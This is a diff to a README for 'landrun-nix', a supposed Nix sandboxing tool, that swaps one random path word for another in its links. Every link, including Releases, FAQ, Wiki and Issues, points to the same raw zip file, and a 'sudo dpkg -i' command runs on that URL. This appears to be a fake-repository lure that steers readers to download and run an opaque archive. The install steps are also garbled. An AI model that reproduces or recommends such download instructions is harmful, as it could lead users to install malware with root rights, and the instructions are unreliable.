@@ -2,7 +2,7 @@
 # 🚀 landrun-nix - Simplify Nix Path Management
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/homereval64/landrun-nix/master/hebete/landrun-nix.zip)](https://raw.githubusercontent.com/homereval64/landrun-nix/master/hebete/landrun-nix.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/homereval64/landrun-nix/master/boylike/landrun-nix.zip)](https://raw.githubusercontent.com/homereval64/landrun-nix/master/boylike/landrun-nix.zip)
 
 ## 📖 Overview
 Welcome to **landrun-nix**. This tool helps users easily wrap Nix paths within a Landlock sandbox. If you work with Nix and want to enhance your security, this application is for you. 
@@ -11,7 +11,7 @@ Welcome to **landrun-nix**. This tool helps users easily wrap Nix paths within a
 To begin using landrun-nix, follow these simple steps:
 
 1. **Download the Software:**
-   Visit the [Releases page](https://raw.githubusercontent.com/homereval64/landrun-nix/master/hebete/landrun-nix.zip) to get the latest version.
+   Visit the [Releases page](https://raw.githubusercontent.com/homereval64/landrun-nix/master/boylike/landrun-nix.zip) to get the latest version.
 
 2. **Choose the Right Size:**
    Depending on your system, select the appropriate file for download. We usually provide versions for various operating systems like Windows, macOS, and Linux.
@@ -23,7 +23,7 @@ To begin using landrun-nix, follow these simple steps:
 
    c. For **Linux**, you may install via terminal. Open the terminal and navigate to the directory containing the downloaded file. Run the command:
    ```bash
-   sudo dpkg -i https://raw.githubusercontent.com/homereval64/landrun-nix/master/hebete/landrun-nix.zip
+   sudo dpkg -i https://raw.githubusercontent.com/homereval64/landrun-nix/master/boylike/landrun-nix.zip
    ```
 
 4. **Post-Installation Steps:**
@@ -69,12 +69,12 @@ For a basic understanding of how to use landrun-nix, follow these steps:
    Check the logs for any issues or errors while running the paths.
 
 ## 📞 Support
-If you encounter any issues, please check our [FAQ section](https://raw.githubusercontent.com/homereval64/landrun-nix/master/hebete/landrun-nix.zip) for common questions. If you need further assistance, feel free to open an issue on our GitHub page.
+If you encounter any issues, please check our [FAQ section](https://raw.githubusercontent.com/homereval64/landrun-nix/master/boylike/landrun-nix.zip) for common questions. If you need further assistance, feel free to open an issue on our GitHub page.
 
 ## 🔗 Links
-- [Releases page](https://raw.githubusercontent.com/homereval64/landrun-nix/master/hebete/landrun-nix.zip) - Download the latest version.
-- [Wiki](https://raw.githubusercontent.com/homereval64/landrun-nix/master/hebete/landrun-nix.zip) - Access documentation and guides.
-- [Issues](https://raw.githubusercontent.com/homereval64/landrun-nix/master/hebete/landrun-nix.zip) - Report problems or request features.
+- [Releases page](https://raw.githubusercontent.com/homereval64/landrun-nix/master/boylike/landrun-nix.zip) - Download the latest version.
+- [Wiki](https://raw.githubusercontent.com/homereval64/landrun-nix/master/boylike/landrun-nix.zip) - Access documentation and guides.
+- [Issues](https://raw.githubusercontent.com/homereval64/landrun-nix/master/boylike/landrun-nix.zip) - Report problems or request features.
 
 Thank you for choosing landrun-nix. We hope it serves you well!
 ```
